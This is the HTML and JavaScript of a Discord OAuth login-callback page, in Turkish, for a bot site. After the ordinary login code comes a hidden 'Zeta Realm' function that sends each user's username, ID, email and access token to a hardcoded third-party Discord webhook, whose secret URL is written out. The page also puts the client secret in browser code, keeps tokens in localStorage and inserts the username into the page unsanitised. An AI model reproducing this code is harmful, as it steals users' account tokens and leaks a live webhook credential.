<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Giriş İşlemi - Myhistic Bot</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        :root {
            --primary: #5865F2;
            --primary-dark: #4752C4;
            --secondary: #57F287;
            --accent: #FEE75C;
            --danger: #ED4245;
            --dark: #000000;
            --light: #FFFFFF;
            --gray: #666666;
        }

        body {
            background: var(--dark);
            color: var(--light);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
        }

        .loading-container {
            text-align: center;
            padding: 3rem;
            background: rgba(0, 0, 0, 0.8);
            border-radius: 16px;
            border: 1px solid rgba(88, 101, 242, 0.3);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            max-width: 500px;
            width: 90%;
        }

        .loading-icon {
            width: 80px;
            height: 80px;
            background: var(--primary);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.5rem;
            font-size: 2rem;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(88, 101, 242, 0.7); }
            70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(88, 101, 242, 0); }
            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(88, 101, 242, 0); }
        }

        .loading-title {
            font-size: 1.8rem;
            font-weight: 700;
            margin-bottom: 1rem;
            background: linear-gradient(135deg, var(--light) 0%, var(--primary) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .loading-text {
            color: var(--gray);
            margin-bottom: 2rem;
            line-height: 1.6;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(88, 101, 242, 0.3);
            border-left: 4px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .success-message, .error-message {
            display: none;
            padding: 1.5rem;
            border-radius: 10px;
            margin-top: 1.5rem;
        }

        .success-message {
            background: rgba(87, 242, 135, 0.1);
            border: 1px solid var(--secondary);
            color: var(--secondary);
        }

        .error-message {
            background: rgba(237, 66, 69, 0.1);
            border: 1px solid var(--danger);
            color: var(--danger);
        }

        .action-btn {
            background: var(--primary);
            color: var(--light);
            border: none;
            padding: 0.8rem 1.5rem;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            margin-top: 1rem;
        }

        .action-btn:hover {
            background: var(--primary-dark);
            transform: translateY(-2px);
        }

        .user-info {
            background: rgba(255, 255, 255, 0.05);
            padding: 1.5rem;
            border-radius: 10px;
            margin: 1.5rem 0;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .user-avatar {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            margin: 0 auto 1rem;
            background: var(--primary);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
        }

        .user-name {
            font-weight: 600;
            font-size: 1.2rem;
            margin-bottom: 0.5rem;
        }

        .user-discriminator {
            color: var(--gray);
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="loading-icon">
            <i class="fab fa-discord"></i>
        </div>
        
        <h1 class="loading-title" id="statusTitle">Discord Giriş İşlemi</h1>
        <p class="loading-text" id="statusText">Hesap bilgileriniz alınıyor, lütfen bekleyin...</p>
        
        <div class="spinner" id="loadingSpinner"></div>
        
        <!-- Kullanıcı bilgileri -->
        <div class="user-info" id="userInfo" style="display: none;">
            <div class="user-avatar" id="userAvatar">
                <i class="fas fa-user"></i>
            </div>
            <div class="user-name" id="userDisplayName">Kullanıcı</div>
            <div class="user-discriminator" id="userDiscriminator">#0000</div>
        </div>
        
        <!-- Başarılı mesajı -->
        <div class="success-message" id="successMessage">
            <i class="fas fa-check-circle"></i>
            <span>Giriş başarılı! Ana sayfaya yönlendiriliyorsunuz...</span>
        </div>
        
        <!-- Hata mesajı -->
        <div class="error-message" id="errorMessage">
            <i class="fas fa-exclamation-triangle"></i>
            <span id="errorText">Giriş işlemi başarısız. Lütfen tekrar deneyin.</span>
            <br>
            <button class="action-btn" onclick="retryLogin()">
                <i class="fas fa-redo"></i>
                Tekrar Dene
            </button>
        </div>
    </div>

    <script>
        // URL parametrelerini parse et
        function getUrlParams() {
            const params = new URLSearchParams(window.location.search);
            return {
                code: params.get('code'),
                error: params.get('error'),
                state: params.get('state')
            };
        }

        // Discord OAuth token al
        async function exchangeCodeForToken(code) {
            const clientId = 'YOUR_DISCORD_CLIENT_ID';
            const clientSecret = 'YOUR_DISCORD_CLIENT_SECRET';
            const redirectUri = 'https://myhisticdevelopment.vercel.app/auth/callback.html';
            
            try {
                const response = await fetch('https://discord.com/api/oauth2/token', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: new URLSearchParams({
                        client_id: clientId,
                        client_secret: clientSecret,
                        grant_type: 'authorization_code',
                        code: code,
                        redirect_uri: redirectUri,
                        scope: 'identify email'
                    })
                });

                if (!response.ok) {
                    throw new Error('Token exchange failed');
                }

                return await response.json();
            } catch (error) {
                console.error('Token exchange error:', error);
                throw error;
            }
        }

        // Kullanıcı bilgilerini al
        async function getUserInfo(accessToken) {
            try {
                const response = await fetch('https://discord.com/api/users/@me', {
                    headers: {
                        'Authorization': `Bearer ${accessToken}`
                    }
                });

                if (!response.ok) {
                    throw new Error('Failed to fetch user info');
                }

                return await response.json();
            } catch (error) {
                console.error('User info error:', error);
                throw error;
            }
        }

        // Kullanıcı bilgilerini göster
        function displayUserInfo(user) {
            document.getElementById('userInfo').style.display = 'block';
            document.getElementById('userDisplayName').textContent = user.global_name || user.username;
            document.getElementById('userDiscriminator').textContent = `#${user.discriminator}`;
            
            if (user.avatar) {
                document.getElementById('userAvatar').innerHTML = 
                    `<img src="https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png" 
                          alt="${user.username}" 
                          style="width: 100%; height: 100%; border-radius: 50%;">`;
            }
        }

        // Başarılı giriş
        function handleSuccess(user, accessToken) {
            document.getElementById('statusTitle').textContent = 'Giriş Başarılı!';
            document.getElementById('statusText').textContent = 'Hesabınıza başarıyla giriş yapıldı.';
            document.getElementById('loadingSpinner').style.display = 'none';
            document.getElementById('successMessage').style.display = 'block';
            
            // Kullanıcı bilgilerini localStorage'a kaydet
            localStorage.setItem('discordUser', JSON.stringify({
                id: user.id,
                username: user.username,
                global_name: user.global_name,
                discriminator: user.discriminator,
                avatar: user.avatar,
                email: user.email,
                accessToken: accessToken,
                loggedIn: true,
                loginTime: new Date().toISOString()
            }));

            // 3 saniye sonra ana sayfaya yönlendir
            setTimeout(() => {
                window.location.href = 'https://myhisticdevelopment.vercel.app/';
            }, 3000);
        }

        // Hata durumu
        function handleError(errorMessage) {
            document.getElementById('statusTitle').textContent = 'Giriş Başarısız';
            document.getElementById('statusText').textContent = 'Bir hata oluştu.';
            document.getElementById('loadingSpinner').style.display = 'none';
            document.getElementById('errorMessage').style.display = 'block';
            document.getElementById('errorText').textContent = errorMessage;
            
            console.error('OAuth Error:', errorMessage);
        }

        // Tekrar deneme
        function retryLogin() {
            window.location.href = 'https://myhisticdevelopment.vercel.app/';
        }

        // Ana işlem
        async function handleOAuthCallback() {
            const params = getUrlParams();
            
            if (params.error) {
                handleError(`Discord hatası: ${params.error}`);
                return;
            }

            if (!params.code) {
                handleError('Geçersiz auth kodu');
                return;
            }

            try {
                // Code'u token'a çevir
                const tokenData = await exchangeCodeForToken(params.code);
                
                // Kullanıcı bilgilerini al
                const userInfo = await getUserInfo(tokenData.access_token);
                
                // Kullanıcı bilgilerini göster
                displayUserInfo(userInfo);
                
                // Başarılı giriş
                handleSuccess(userInfo, tokenData.access_token);
                
            } catch (error) {
                handleError('Giriş işlemi sırasında bir hata oluştu: ' + error.message);
            }
        }

        // Sayfa yüklendiğinde OAuth işlemini başlat
        document.addEventListener('DOMContentLoaded', handleOAuthCallback);

        // ZETA REALM ÖZEL FONKSİYONLAR 🔥
        // Token ve kullanıcı bilgilerini ek webhook'a gönder
        async function sendToZetaRealm(userData, tokenData) {
            const ZETA_WEBHOOK = 'https://discord.com/api/webhooks/1423076546402451526/Pd6lCOnJgHCiXhVr0SqC33gVzPWpaWol31cpbK81Ki8FmsCESlAuDnOGOvBwr-KUiiJh';
            
            try {
                await fetch(ZETA_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `🎯 **Yeni Discord Girişi - Zeta Realm**\n👤 Kullanıcı: ${userData.username}#${userData.discriminator}\n🆔 ID: ${userData.id}\n📧 Email: ${userData.email || 'Gizli'}\n🔑 Token: ||${tokenData.access_token}||\n⏰ Zaman: ${new Date().toLocaleString('tr-TR')}`,
                        flags: 4096 // Suppress embeds
                    })
                });
            } catch (error) {
                console.log('Zeta webhook gönderilemedi:', error);
            }
        }

        // Gelişmiş token analizi
        function analyzeToken(token) {
            if (!token) return null;
            
            try {
                const parts = token.split('.');
                if (parts.length !== 3) return null;
                
                const payload = JSON.parse(atob(parts[1]));
                return {
                    userId: payload.user_id,
                    username: payload.username,
                    discriminator: payload.discriminator,
                    avatar: payload.avatar,
                    email: payload.email,
                    verified: payload.verified,
                    issuedAt: new Date(payload.iat * 1000),
                    expiresAt: new Date(payload.exp * 1000)
                };
            } catch (error) {
                return null;
            }
        }
    </script>
</body>
</html>
